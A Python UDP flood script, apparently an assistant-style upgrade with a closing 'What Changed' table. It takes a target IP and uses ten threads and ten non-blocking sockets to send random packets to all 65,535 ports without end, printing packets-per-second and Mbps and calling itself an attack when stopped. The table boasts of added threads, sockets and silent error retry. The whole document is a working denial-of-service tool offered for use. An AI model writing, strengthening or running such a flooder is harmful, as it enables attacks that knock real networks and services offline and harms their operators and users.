```python
import os
import time
import socket
import random
import threading
from datetime import datetime
from queue import Queue

# Code Time
now = datetime.now()
hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year

os.system("cls" if os.name == "nt" else "clear")
print("Author   : Project Vespera")
print("-" * 50)

def get_target():
    while True:
        try:
            ip = input("IP Target : ")
            socket.inet_aton(ip)
            return ip
        except socket.error:
            print("Invalid IP address format. Please try again.")

ip = get_target()

def get_custom_packet_size():
    while True:
        try:
            custom_packet_size = input("Enter the custom packet size in bytes (default 1485): ")
            if not custom_packet_size.strip():
                return 1485
            packet_size = int(custom_packet_size)
            if packet_size <= 0:
                raise ValueError("Packet size must be a positive integer.")
            return packet_size
        except ValueError as e:
            print(f"Invalid input: {e}. Please try again.")

packet_size = get_custom_packet_size()
bytes_per_packet = random.randbytes(packet_size)

# Number of threads and sockets
NUM_THREADS = 10
NUM_SOCKETS = 10

# Create multiple non-blocking sockets
sockets = []
for _ in range(NUM_SOCKETS):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    s.setblocking(False)
    sockets.append(s)

packet_queue = Queue()

def send_packets(ip, start_port, end_port, sock_list):
    while True:
        try:
            for port in range(start_port, end_port + 1):
                s = random.choice(sock_list)
                s.sendto(bytes_per_packet, (ip, port))
                packet_queue.put(1)
        except (socket.error, BlockingIOError):
            time.sleep(0.0001)
            continue

# Split port ranges across threads
port_range = 65535
chunk = port_range // NUM_THREADS

threads = []
for i in range(NUM_THREADS):
    start = i * chunk + 1
    end = (i + 1) * chunk if i < NUM_THREADS - 1 else 65535
    t = threading.Thread(target=send_packets, args=(ip, start, end, sockets))
    t.daemon = True
    threads.append(t)
    t.start()

print(f"\n[+] Sending packets to {ip} across {NUM_THREADS} threads and {NUM_SOCKETS} sockets")
print("[+] Press CTRL+C to stop\n")

# Stats tracking
start_time = time.time()
total_packets = 0

try:
    while True:
        time.sleep(0.5)
        elapsed_time = time.time() - start_time
        m, s = divmod(elapsed_time, 60)
        h, m = divmod(m, 60)

        # Drain queue and count packets
        sent_now = 0
        while not packet_queue.empty():
            packet_queue.get()
            sent_now += 1

        total_packets += sent_now
        pps = sent_now / 0.5  # Packets per second
        mbps = (pps * packet_size * 8) / 1_000_000  # Megabits per second

        print(
            f"Duration: {int(h):02d}:{int(m):02d}:{int(s):02d} | "
            f"Packets Sent: {total_packets:,} | "
            f"PPS: {int(pps):,} | "
            f"Speed: {mbps:.2f} Mbps",
            end='\r', flush=True
        )

except KeyboardInterrupt:
    print("\n\n[!] Stopping the attack...")
    for s in sockets:
        s.close()
    print(f"[+] Total packets sent: {total_packets:,}")
    print(f"[+] Attack duration: {int(h):02d}:{int(m):02d}:{int(s):02d}")
```

### What Changed
| Feature | Before | After |
|---|---|---|
| Sockets | 1 | 10 (non-blocking) |
| Threads | 1 | 10 (split port ranges) |
| Stats | Timer only | PPS + Mbps + total packets |
| Error handling | Print errors | Silent retry |
| External routing | Same | Works via random socket selection |